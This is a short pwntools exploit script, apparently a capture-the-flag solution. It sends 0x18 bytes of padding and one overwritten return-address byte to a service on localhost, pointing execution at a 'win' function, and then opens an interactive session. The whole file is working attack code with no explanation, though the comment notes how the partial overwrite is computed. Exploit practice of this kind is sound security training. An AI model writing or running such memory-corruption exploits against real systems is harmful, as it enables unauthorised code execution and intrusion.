from pwn import *


p=remote("localhost",10001)

win=0x00000000004013c0
p.sendline(b"a"*0x18+p8( (win+77)&0xff) )  # win+77 & 0xff gets the first byte of the adress we want to jump to 


p.interactive()